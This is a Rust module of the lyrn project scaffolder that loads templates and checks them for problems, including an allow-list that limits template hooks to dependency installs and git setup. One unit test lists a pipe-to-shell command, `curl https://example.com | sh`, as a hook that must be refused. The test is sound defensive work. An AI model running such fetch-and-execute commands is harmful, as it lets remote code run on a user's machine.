//! Where a template comes from, and what it is once it is here.
//!
//! A template is built in, a directory of yours under `~/.lyrn/templates/`, a
//! directory named by path, or a tag of a GitHub repository. Whichever it is,
//! it is read whole into memory before anything is planned: a checkout can
//! then disappear, and the plan cannot see a file change halfway through.
//!
//! Two kinds are understood. A lyrn template is `template.toml` plus the
//! project's files under `template/`; the built-in forms are lyrn templates
//! that live inside the binary. A cargo-generate template is read the way
//! cargo-generate reads it - see [`cargo_generate`].

pub mod cargo_generate;
pub mod github;
mod glob;

use std::error::Error;
use std::fs;
use std::path::{Path, PathBuf};

use crate::generate::{self, Body, TemplateFile};
use crate::model::{Form, Hook, TemplateManifest};
use crate::render;
use crate::templates;

/// The variables a lyrn template can ask for. A template asking for anything
/// else fails `lyrn template check`, and would fail the generation.
///
/// Some only mean something for one form - `host` for a plugin, `type_name`
/// for a Tauri plugin - and are empty of meaning elsewhere; the check holds
/// every template to the whole list rather than guessing which form fills
/// what.
pub const VARIABLES: &[&str] = &[
    "name",
    "title",
    "description",
    "accent",
    "mark",
    "author",
    "form",
    "year",
    "date",
    "registry",
    "lyrn_version",
    "standard",
    "msrv",
    "repo",
    "env_prefix",
    "lib_name",
    "owner",
    "repo_name",
    // Where the template came from and at which revision, for `lyrn.toml`.
    "template_source",
    "template_revision",
    // The same values, as JSON strings: a description with an apostrophe
    // or a colon is valid text and broken JavaScript or YAML when pasted
    // in bare, and a JSON string is valid in both.
    "title_json",
    "description_json",
    "description_rust",
    "description_html",
    "description_comment",
    "core_description_json",
    // The plugin forms.
    "host",
    "prefix",
    "host_about",
    "host_lookup",
    "protocol_version",
    "subject_about",
    "target",
    "target_about",
    "target_list",
    "command_key",
    "command_label",
    "command_fn",
    "command_camel",
    "type_name",
    "bin_name",
];

/// The directory under a lyrn template's root that holds the project's files.
/// Everything beside it - the template's own README, its CI - stays behind.
pub const FILES_DIR: &str = "template";

/// A template, read and ready to plan.
pub struct Template {
    pub origin: Origin,
    pub kind: Kind,
}

pub enum Kind {
    Lyrn(Native),
    CargoGenerate(cargo_generate::CargoTemplate),
}

/// A lyrn template: a form, its manifest, its files and its add-ons.
pub struct Native {
    pub form: Form,
    pub manifest: TemplateManifest,
    pub files: Vec<TemplateFile>,
    pub addons: Vec<AddonSpec>,
}

/// An add-on a template offers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AddonSpec {
    pub name: String,
    pub summary: String,
}

/// Where a template was read from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Origin {
    BuiltIn,
    /// `~/.lyrn/templates/<name>`.
    Local {
        name: String,
        dir: PathBuf,
    },
    /// A directory named by path.
    Path(PathBuf),
    /// A tag of a GitHub repository, at the commit its CI passed on.
    GitHub {
        repo: String,
        tag: String,
        commit: String,
    },
}

impl Origin {
    /// What `lyrn.toml` records as the template's source.
    pub fn source(&self) -> String {
        match self {
            Origin::BuiltIn => "lyrn".to_string(),
            Origin::Local { name, .. } => format!("local:{name}"),
            // The directory's name, not its path: a path is one machine's,
            // and the repository it lands in is everybody's.
            Origin::Path(dir) => format!("path:{}", display_name(dir)),
            Origin::GitHub { repo, tag, .. } => format!("{repo}@{tag}"),
        }
    }

    /// What `lyrn.toml` records as the revision the files came from.
    pub fn revision(&self) -> String {
        match self {
            Origin::BuiltIn => env!("CARGO_PKG_VERSION").to_string(),
            Origin::GitHub { commit, .. } => commit.clone(),
            // A directory has no revision lyrn can name; saying so is better
            // than a timestamp that looks like one.
            Origin::Local { .. } | Origin::Path(_) => "unversioned".to_string(),
        }
    }

    /// The line a generation starts with when the template is not the
    /// built-in one, so nobody mistakes whose files they are getting.
    pub fn notice(&self, form: Option<Form>) -> Option<String> {
        match self {
            Origin::BuiltIn => None,
            Origin::Local { dir, .. } => Some(match form {
                Some(form) if dir.file_name().is_some_and(|n| n == form.as_str()) => {
                    format!("Using your template `{}` in place of the built-in {form} form.", dir.display())
                }
                _ => format!("Using your template `{}`.", dir.display()),
            }),
            Origin::Path(dir) => Some(format!("Using the template in `{}`.", dir.display())),
            Origin::GitHub { repo, tag, commit } => Some(format!(
                "Using the template {repo}@{tag} (commit {}), which passed its CI.",
                &commit[..commit.len().min(12)]
            )),
        }
    }
}

fn display_name(dir: &Path) -> String {
    dir.canonicalize()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .or_else(|| dir.file_name().map(|n| n.to_string_lossy().into_owned()))
        .unwrap_or_else(|| "template".to_string())
}

/// Where lyrn keeps what is yours: `~/.lyrn`, or `LYRN_HOME`.
///
/// A home directory rather than the platform's data directory, because the
/// place is something people put templates into by hand, and `~/.lyrn` is
/// the same words on every system.
pub fn lyrn_home() -> Option<PathBuf> {
    if let Some(home) = std::env::var_os("LYRN_HOME").filter(|v| !v.is_empty()) {
        return Some(PathBuf::from(home));
    }
    home_dir().map(|home| home.join(".lyrn"))
}

/// Where local templates live.
pub fn local_templates_dir() -> Option<PathBuf> {
    lyrn_home().map(|home| home.join("templates"))
}

/// The user's home directory. `std::env::home_dir` is deprecated on the
/// toolchain this crate promises, so it is read the way that function reads
/// it on each platform.
fn home_dir() -> Option<PathBuf> {
    let var = if cfg!(windows) { "USERPROFILE" } else { "HOME" };
    std::env::var_os(var).filter(|v| !v.is_empty()).map(PathBuf::from)
}

/// The template a form means here: your local one of the same name if you
/// have one, else the one built in.
pub fn for_form(form: Form) -> Result<Template, Box<dyn Error>> {
    if let Some(dir) = local_templates_dir().map(|d| d.join(form.as_str())).filter(|d| d.is_dir()) {
        let origin = Origin::Local {
            name: form.as_str().to_string(),
            dir: dir.clone(),
        };
        let template = load_dir(&dir, origin)?;
        // A directory named after a form stands in for it, so it has to be
        // that form: `~/.lyrn/templates/spa` generating a cli project would
        // make `--form spa` mean something else on this one machine.
        return match &template.kind {
            Kind::Lyrn(native) if native.form == form => Ok(template),
            Kind::Lyrn(native) => Err(format!(
                "`{}` stands in for the {form} form, but its template.toml says `form = \"{}\"`",
                dir.display(),
                native.form
            )
            .into()),
            Kind::CargoGenerate(_) => Err(format!(
                "`{}` stands in for the {form} form, but it is a cargo-generate template - rename it, and use it with `--template`",
                dir.display()
            )
            .into()),
        };
    }
    Ok(builtin(form))
}

/// A built-in form's manifest.
pub fn builtin_manifest(form: Form) -> TemplateManifest {
    toml::from_str(templates::manifest_for(form)).expect("every built-in manifest parses; a unit test holds it")
}

/// A built-in form as a template.
pub fn builtin(form: Form) -> Template {
    let manifest = builtin_manifest(form);
    Template {
        origin: Origin::BuiltIn,
        kind: Kind::Lyrn(Native {
            form,
            manifest,
            files: templates::sources_for(form).into_iter().map(TemplateFile::from).collect(),
            addons: form
                .addons()
                .iter()
                .map(|a| AddonSpec {
                    name: a.as_str().to_string(),
                    summary: a.summary().to_string(),
                })
                .collect(),
        }),
    }
}

/// What `--template` can name.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Spec {
    Path(PathBuf),
    Local(String),
    GitHub { owner: String, repo: String, tag: String },
}

/// Read a `--template` value by its shape alone, never by what happens to be
/// on disk: a directory called `lacodda/template-spa@v1` in the current one
/// must not stand in for the repository of that name.
pub fn parse_spec(spec: &str) -> Result<Spec, String> {
    const SHAPES: &str = "a path (`./my-template`), a name under ~/.lyrn/templates (`my-template`), or a GitHub tag (`owner/repo@v1.0.0`)";

    if spec.is_empty() {
        return Err(format!("`--template` needs a value: {SHAPES}"));
    }
    if let Some(rest) = spec.strip_prefix("~/").or_else(|| spec.strip_prefix("~\\")) {
        let home = home_dir().ok_or("`~` means the home directory, and there is none to read")?;
        return Ok(Spec::Path(home.join(rest)));
    }
    let looks_like_a_path =
        spec == "." || spec == ".." || ["./", "../", ".\\", "..\\", "/", "\\"].iter().any(|prefix| spec.starts_with(prefix)) || Path::new(spec).is_absolute();
    if looks_like_a_path {
        return Ok(Spec::Path(PathBuf::from(spec)));
    }
    if let Some((repository, tag)) = spec.split_once('@') {
        let (owner, repo) = github_repository(repository).ok_or_else(|| format!("`{spec}` is not `owner/repo@tag`; {SHAPES}"))?;
        if tag.is_empty() || tag.chars().any(|c| c.is_whitespace() || c == '@') {
            return Err(format!("`{spec}` names no tag after `@`"));
        }
        return Ok(Spec::GitHub {
            owner,
            repo,
            tag: tag.to_string(),
        });
    }
    if github_repository(spec).is_some() {
        return Err(format!(
            "`{spec}` names no tag: a template from GitHub is used at a tag, so what a project was made from can be named again - `{spec}@<tag>`"
        ));
    }
    if crate::naming::validate_name(spec).is_ok() {
        return Ok(Spec::Local(spec.to_string()));
    }
    Err(format!("`{spec}` is none of {SHAPES}"))
}

/// `owner/repo` split in two, if it is that shape: GitHub's own alphabet for
/// both, and nothing else.
fn github_repository(text: &str) -> Option<(String, String)> {
    let (owner, repo) = text.split_once('/')?;
    let valid = |part: &str| !part.is_empty() && part != "." && part != ".." && part.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
    (valid(owner) && valid(repo)).then(|| (owner.to_string(), repo.to_string()))
}

/// The template `--template` names.
pub fn resolve(spec: &str) -> Result<Template, Box<dyn Error>> {
    match parse_spec(spec)? {
        Spec::Path(dir) => {
            if !dir.is_dir() {
                return Err(format!("`{}` is not a directory", dir.display()).into());
            }
            load_dir(&dir, Origin::Path(dir.clone()))
        }
        Spec::Local(name) => {
            let base = local_templates_dir().ok_or("there is no home directory to find ~/.lyrn/templates in; set LYRN_HOME")?;
            let dir = base.join(&name);
            if !dir.is_dir() {
                let mut message = format!("there is no template `{name}` in `{}`", base.display());
                if name.parse::<Form>().is_ok() {
                    message.push_str(&format!(" - the built-in form is `--form {name}`"));
                }
                return Err(message.into());
            }
            load_dir(&dir, Origin::Local { name, dir: dir.clone() })
        }
        Spec::GitHub { owner, repo, tag } => github::fetch(&owner, &repo, &tag),
    }
}

/// Read a template directory, whichever kind it is.
pub fn load_dir(dir: &Path, origin: Origin) -> Result<Template, Box<dyn Error>> {
    let kind = if dir.join("template.toml").is_file() {
        Kind::Lyrn(load_native(dir)?)
    } else if cargo_generate::is_one(dir) {
        Kind::CargoGenerate(cargo_generate::load(dir)?)
    } else {
        return Err(format!(
            "`{}` is not a template: it has no template.toml, and no cargo-generate.toml or Cargo.toml to read it as a cargo-generate one",
            dir.display()
        )
        .into());
    };
    Ok(Template { origin, kind })
}

/// Read a lyrn template from a directory, and refuse it if it has problems.
fn load_native(dir: &Path) -> Result<Native, Box<dyn Error>> {
    let manifest_path = dir.join("template.toml");
    let text = fs::read_to_string(&manifest_path)?;
    let manifest: TemplateManifest = toml::from_str(&text).map_err(|e| {
        // An unknown field is most often a newer template, so the refusal
        // says what would read it rather than only what is wrong.
        format!("`{}`: {e}", manifest_path.display())
    })?;
    if let Some(required) = &manifest.lyrn {
        require_version(required)?;
    }
    let form = manifest.form.ok_or_else(|| {
        format!(
            "`{}` names no `form`: a template is a version of one of lyrn's forms (see `lyrn forms`)",
            manifest_path.display()
        )
    })?;

    let root = dir.join(FILES_DIR);
    if !root.is_dir() {
        return Err(format!("`{}` has no `{FILES_DIR}/` directory with the project's files in it", dir.display()).into());
    }
    let mut files = Vec::new();
    // The disk's executable bit is not asked: a checkout on Windows has none,
    // so the manifest is the one place that says.
    for DiskFile { path, bytes, .. } in read_tree(&root, &[])? {
        let executable = manifest.executable.contains(&path);
        let addon = manifest.addons.iter().find(|a| a.files.contains(&path)).map(|a| a.name.clone());
        files.push(TemplateFile {
            body: body_of(bytes),
            path,
            executable,
            addon,
        });
    }

    let addons = manifest
        .addons
        .iter()
        .map(|a| AddonSpec {
            name: a.name.clone(),
            summary: a.summary.clone(),
        })
        .collect();
    let native = Native { form, manifest, files, addons };
    let problems = problems(&native, &section_names(&native));
    if !problems.is_empty() {
        return Err(format!("`{}` is not a template lyrn can use:\n  {}", dir.display(), problems.join("\n  ")).into());
    }
    Ok(native)
}

/// Text if it is UTF-8, bytes if it is not: an icon has no placeholders and
/// must not be read as text.
pub fn body_of(bytes: Vec<u8>) -> Body {
    match String::from_utf8(bytes) {
        Ok(text) => Body::Text(text),
        Err(e) => Body::Binary(e.into_bytes()),
    }
}

/// A file of a template directory, as it is on disk.
pub struct DiskFile {
    /// Relative to the directory read, `/`-separated.
    pub path: String,
    pub bytes: Vec<u8>,
    pub executable: bool,
}

/// Every file under `root`, as `/`-separated relative paths in byte order,
/// with its bytes and whether it is executable on disk, skipping the
/// directories named in `skip` at any depth.
///
/// A symbolic link is refused rather than followed: one pointing out of the
/// template would copy whatever it points at - a key, a token - into the new
/// project, and from there into its first commit.
pub fn read_tree(root: &Path, skip: &[&str]) -> Result<Vec<DiskFile>, Box<dyn Error>> {
    fn walk(dir: &Path, prefix: &str, skip: &[&str], out: &mut Vec<DiskFile>) -> Result<(), Box<dyn Error>> {
        let mut entries: Vec<_> = fs::read_dir(dir)?.collect::<Result<_, _>>()?;
        entries.sort_by_key(|e| e.file_name());
        for entry in entries {
            let name = entry.file_name().to_string_lossy().into_owned();
            let path = if prefix.is_empty() { name.clone() } else { format!("{prefix}/{name}") };
            let kind = entry.file_type()?;
            if kind.is_symlink() {
                return Err(format!("`{path}` is a symbolic link; a template carries files, not links to them").into());
            }
            if kind.is_dir() {
                if !skip.contains(&name.as_str()) {
                    walk(&entry.path(), &path, skip, out)?;
                }
            } else {
                out.push(DiskFile {
                    bytes: fs::read(entry.path())?,
                    executable: is_executable(&entry.metadata()?),
                    path,
                });
            }
        }
        Ok(())
    }
    let mut out = Vec::new();
    walk(root, "", skip, &mut out)?;
    Ok(out)
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_metadata: &fs::Metadata) -> bool {
    false
}

/// Refuse a template that needs a newer lyrn than this one.
fn require_version(required: &str) -> Result<(), String> {
    let parse = |v: &str| -> Option<(u64, u64, u64)> {
        let mut parts = v.trim().trim_start_matches('v').split('.');
        let major = parts.next()?.parse().ok()?;
        let minor = parts.next().map_or(Some(0), |p| p.parse().ok())?;
        let patch = parts.next().map_or(Some(0), |p| p.parse().ok())?;
        parts.next().is_none().then_some((major, minor, patch))
    };
    let wanted = parse(required).ok_or_else(|| format!("`lyrn = \"{required}\"` is not a version like `2.9.0`"))?;
    let running = parse(env!("CARGO_PKG_VERSION")).expect("the crate's own version parses");
    if running < wanted {
        return Err(format!(
            "the template needs lyrn {required} or newer, and this is {}; update lyrn",
            env!("CARGO_PKG_VERSION")
        ));
    }
    Ok(())
}

/// The section names a template may use: its own add-ons.
pub fn section_names(native: &Native) -> Vec<String> {
    native.addons.iter().map(|a| a.name.clone()).collect()
}

/// The hooks a template from outside may ask for: the commands lyrn's own
/// forms run, and nothing else.
///
/// A template's CI proves that the project it writes builds; it says nothing
/// about what its hook does to the machine it runs on. Fetching dependencies
/// and starting the repository are all any form has needed, so that is the
/// whole vocabulary.
pub fn hook_is_allowed(hook: &Hook) -> bool {
    let run: Vec<&str> = hook.run.iter().map(String::as_str).collect();
    let command_ok = match run.as_slice() {
        ["pnpm", "install"] | ["npm", "install"] | ["cargo", "fetch"] | ["git", "init"] | ["git", "add", "."] => true,
        ["git", "init", flag] => flag.strip_prefix("--initial-branch=").is_some_and(|b| !b.is_empty()),
        ["git", "commit", "-m", message] => !message.is_empty(),
        _ => false,
    };
    let dir_ok = hook.dir.as_deref().is_none_or(|d| generate::inside_the_project(d).is_some());
    command_ok && dir_ok
}

/// Everything wrong with a lyrn template, each as one line. Empty means the
/// template can be used.
///
/// `sections` are the names a `{{#name}}` section may carry. A template's own
/// add-ons, as a rule; the built-in forms share files across forms, and a
/// desktop project carries sections of the spa's add-ons it always cuts.
pub fn problems(native: &Native, sections: &[String]) -> Vec<String> {
    let mut problems = Vec::new();
    let paths: Vec<&str> = native.files.iter().map(|f| f.path.as_str()).collect();
    let manifest = &native.manifest;

    for file in &native.files {
        let verbatim = manifest.verbatim.contains(&file.path);
        for key in render::placeholders(&file.path) {
            if !VARIABLES.contains(&key.as_str()) {
                problems.push(format!("`{}`: its name asks for `{{{{ {key} }}}}`, which lyrn does not provide", file.path));
            }
        }
        // A verbatim file is copied as it is, so neither its braces nor
        // anything that looks like a section means anything to lyrn.
        let Body::Text(text) = &file.body else { continue };
        if verbatim {
            continue;
        }
        for key in render::placeholders(text) {
            if !VARIABLES.contains(&key.as_str()) {
                problems.push(format!("`{}` asks for `{{{{ {key} }}}}`, which lyrn does not provide", file.path));
            }
        }
        problems.extend(section_problems(&file.path, text, sections));
    }

    for entry in &manifest.verbatim {
        if !paths.contains(&entry.as_str()) {
            problems.push(format!("`verbatim` names `{entry}`, which is not a file of the template"));
        }
    }
    for entry in &manifest.executable {
        if !paths.contains(&entry.as_str()) {
            problems.push(format!("`executable` names `{entry}`, which is not a file of the template"));
        }
    }

    let mut seen: Vec<&str> = Vec::new();
    for addon in &manifest.addons {
        if crate::naming::validate_name(&addon.name).is_err() {
            problems.push(format!("the add-on `{}` is not a name: lowercase letters, digits and hyphens", addon.name));
        }
        if seen.contains(&addon.name.as_str()) {
            problems.push(format!("the add-on `{}` is declared twice", addon.name));
        }
        seen.push(&addon.name);
        for file in &addon.files {
            if !paths.contains(&file.as_str()) {
                problems.push(format!("the add-on `{}` names `{file}`, which is not a file of the template", addon.name));
            }
            if let Some(other) = manifest.addons.iter().find(|o| o.name != addon.name && o.files.contains(file)) {
                // Reported once, from the first of the two.
                if manifest.addons.iter().position(|a| a.name == addon.name) < manifest.addons.iter().position(|a| a.name == other.name) {
                    problems.push(format!("`{file}` belongs to two add-ons, `{}` and `{}`", addon.name, other.name));
                }
            }
        }
    }

    for hook in &manifest.hooks {
        if !hook_is_allowed(hook) {
            problems.push(format!(
                "the hook `{}` runs `{}`; a template may only install dependencies (pnpm install, npm install, cargo fetch) and start the repository (git init, git add ., git commit -m)",
                hook.name,
                hook.run.join(" ")
            ));
        }
    }

    problems
}

/// Unbalanced or unknown sections in one file.
fn section_problems(path: &str, text: &str, sections: &[String]) -> Vec<String> {
    let mut problems = Vec::new();
    let mut open: Option<&str> = None;
    for (number, line) in text.lines().enumerate() {
        let trimmed = line.trim();
        let opener = trimmed
            .strip_prefix("{{#")
            .or_else(|| trimmed.strip_prefix("{{^"))
            .and_then(|r| r.strip_suffix("}}"));
        if let Some(name) = opener {
            if let Some(outer) = open {
                problems.push(format!("`{path}` line {}: `{name}` opens inside `{outer}`, which is still open", number + 1));
            }
            if !sections.iter().any(|s| s == name) {
                problems.push(format!("`{path}` line {}: the section `{name}` is not an add-on of the template", number + 1));
            }
            open = Some(name);
        } else if let Some(name) = trimmed.strip_prefix("{{/").and_then(|r| r.strip_suffix("}}")) {
            if open != Some(name) {
                problems.push(format!("`{path}` line {}: `{name}` closes a section that is not open", number + 1));
            }
            open = None;
        }
    }
    if let Some(name) = open {
        // An unclosed section is silent damage: with the add-on off it
        // swallows the rest of the file.
        problems.push(format!("`{path}` leaves the section `{name}` unclosed"));
    }
    problems
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::AddonManifest;

    /// The names any built-in form's sections may carry: the desktop and
    /// service forms carry files of the spa form, whose sections they can
    /// never enable and so always cut. A name no form knows is still a
    /// misspelling.
    fn every_builtin_addon() -> Vec<String> {
        Form::ALL.iter().flat_map(|f| f.addons()).map(|a| a.as_str().to_string()).collect()
    }

    fn native(template: Template) -> Native {
        match template.kind {
            Kind::Lyrn(native) => native,
            Kind::CargoGenerate(_) => unreachable!(),
        }
    }

    #[test]
    fn every_builtin_form_is_a_template_without_problems() {
        for form in Form::ALL {
            let native = native(builtin(*form));
            let problems = problems(&native, &every_builtin_addon());
            assert!(problems.is_empty(), "{form}:\n  {}", problems.join("\n  "));
            assert!(!native.manifest.standard.is_empty(), "{form} declares no standard version");
        }
    }

    fn file(path: &str, text: &str) -> TemplateFile {
        TemplateFile {
            path: path.into(),
            body: Body::Text(text.into()),
            executable: false,
            addon: None,
        }
    }

    fn template_with(files: Vec<TemplateFile>, manifest: TemplateManifest) -> Native {
        let addons = manifest
            .addons
            .iter()
            .map(|a| AddonSpec {
                name: a.name.clone(),
                summary: a.summary.clone(),
            })
            .collect();
        Native {
            form: Form::Spa,
            manifest,
            files,
            addons,
        }
    }

    fn problems_of(native: &Native) -> Vec<String> {
        problems(native, &section_names(native))
    }

    #[test]
    fn an_unknown_variable_is_a_problem() {
        let native = template_with(vec![file("README.md", "{{ nope }}")], TemplateManifest::default());
        assert_eq!(problems_of(&native).len(), 1, "{:?}", problems_of(&native));
    }

    #[test]
    fn a_verbatim_file_may_carry_any_braces() {
        let manifest = TemplateManifest {
            verbatim: vec!["cliff.toml".into()],
            ..Default::default()
        };
        let native = template_with(vec![file("cliff.toml", "{{ commit.message }}")], manifest);
        assert!(problems_of(&native).is_empty(), "{:?}", problems_of(&native));
    }

    #[test]
    fn an_unclosed_section_is_a_problem() {
        let manifest = TemplateManifest {
            addons: vec![AddonManifest {
                name: "router".into(),
                summary: String::new(),
                files: vec![],
            }],
            ..Default::default()
        };
        let native = template_with(vec![file("main.tsx", "{{#router}}\nx\n")], manifest);
        assert!(problems_of(&native).iter().any(|p| p.contains("unclosed")), "{:?}", problems_of(&native));
    }

    #[test]
    fn a_section_of_an_undeclared_addon_is_a_problem() {
        let native = template_with(vec![file("main.tsx", "{{#router}}\nx\n{{/router}}\n")], TemplateManifest::default());
        assert!(problems_of(&native).iter().any(|p| p.contains("not an add-on")), "{:?}", problems_of(&native));
    }

    #[test]
    fn manifest_entries_have_to_name_files() {
        let manifest = TemplateManifest {
            verbatim: vec!["gone.txt".into()],
            executable: vec!["gone.sh".into()],
            addons: vec![AddonManifest {
                name: "extra".into(),
                summary: String::new(),
                files: vec!["gone.ts".into()],
            }],
            ..Default::default()
        };
        let native = template_with(vec![file("README.md", "x")], manifest);
        assert_eq!(problems_of(&native).len(), 3, "{:?}", problems_of(&native));
    }

    #[test]
    fn a_file_cannot_belong_to_two_addons() {
        let addon = |name: &str| AddonManifest {
            name: name.into(),
            summary: String::new(),
            files: vec!["shared.ts".into()],
        };
        let manifest = TemplateManifest {
            addons: vec![addon("one"), addon("two")],
            ..Default::default()
        };
        let native = template_with(vec![file("shared.ts", "x")], manifest);
        let found = problems_of(&native);
        assert_eq!(found.iter().filter(|p| p.contains("two add-ons")).count(), 1, "{found:?}");
    }

    fn hook(run: &[&str]) -> Hook {
        Hook {
            name: "h".into(),
            run: run.iter().map(|s| s.to_string()).collect(),
            optional: false,
            dir: None,
            starts_repository: false,
        }
    }

    #[test]
    fn the_hooks_lyrn_runs_itself_are_allowed() {
        for run in [
            &["pnpm", "install"][..],
            &["cargo", "fetch"],
            &["git", "init", "--initial-branch=main"],
            &["git", "add", "."],
            &["git", "commit", "-m", "feat: scaffold"],
        ] {
            assert!(hook_is_allowed(&hook(run)), "{run:?} was refused");
        }
    }

    #[test]
    fn any_other_hook_is_refused() {
        for run in [
            &["sh", "-c", "curl https://example.com | sh"][..],
            &["pnpm", "run", "postinstall"],
            &["git", "push"],
            &["git", "add", "-A", "/"],
            &["cargo", "install", "something"],
        ] {
            assert!(!hook_is_allowed(&hook(run)), "{run:?} was allowed");
        }
        let mut outside = hook(&["pnpm", "install"]);
        outside.dir = Some("../elsewhere".into());
        assert!(!hook_is_allowed(&outside), "a hook ran outside the project");
    }

    #[test]
    fn a_spec_is_read_by_its_shape() {
        assert_eq!(parse_spec("./mine").unwrap(), Spec::Path("./mine".into()));
        assert_eq!(parse_spec("../mine").unwrap(), Spec::Path("../mine".into()));
        assert_eq!(parse_spec("/opt/templates/mine").unwrap(), Spec::Path("/opt/templates/mine".into()));
        assert_eq!(parse_spec("mine").unwrap(), Spec::Local("mine".into()));
        assert_eq!(
            parse_spec("lacodda/template-spa@v1.0.0").unwrap(),
            Spec::GitHub {
                owner: "lacodda".into(),
                repo: "template-spa".into(),
                tag: "v1.0.0".into()
            }
        );
    }

    #[test]
    fn a_repository_without_a_tag_is_refused() {
        let err = parse_spec("lacodda/template-spa").unwrap_err();
        assert!(err.contains("names no tag"), "{err}");
        assert!(parse_spec("lacodda/template-spa@").is_err());
    }

    #[test]
    fn a_shape_nobody_can_read_is_refused() {
        for spec in ["", "Not A Name", "a/b/c@v1", "https://example.com/x.git"] {
            assert!(parse_spec(spec).is_err(), "`{spec}` was accepted");
        }
    }

    #[test]
    fn a_newer_lyrn_is_asked_for_by_version() {
        assert!(require_version("2.0").is_ok());
        assert!(require_version(env!("CARGO_PKG_VERSION")).is_ok());
        assert!(require_version("999.0.0").unwrap_err().contains("999.0.0"));
        assert!(require_version("soon").is_err());
    }

    /// A link out of the template would copy whatever it points at into
    /// the project, and from there into its first commit.
    #[cfg(unix)]
    #[test]
    fn a_symbolic_link_in_a_template_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("template")).unwrap();
        fs::write(dir.path().join("template.toml"), "form = \"spa\"\nstandard = \"2026.09\"\n").unwrap();
        std::os::unix::fs::symlink("/etc/hostname", dir.path().join("template/hostname")).unwrap();
        let err = load_dir(dir.path(), Origin::Path(dir.path().to_path_buf())).err().expect("a link was followed");
        assert!(err.to_string().contains("symbolic link"), "{err}");
    }

    #[test]
    fn origins_say_where_the_files_came_from() {
        let github = Origin::GitHub {
            repo: "lacodda/template-spa".into(),
            tag: "v1.0.0".into(),
            commit: "0123456789abcdef0123456789abcdef01234567".into(),
        };
        assert_eq!(github.source(), "lacodda/template-spa@v1.0.0");
        assert_eq!(github.revision(), "0123456789abcdef0123456789abcdef01234567");
        assert_eq!(Origin::BuiltIn.source(), "lyrn");
        assert_eq!(Origin::BuiltIn.revision(), env!("CARGO_PKG_VERSION"));
        assert!(Origin::BuiltIn.notice(Some(Form::Spa)).is_none());
    }
}
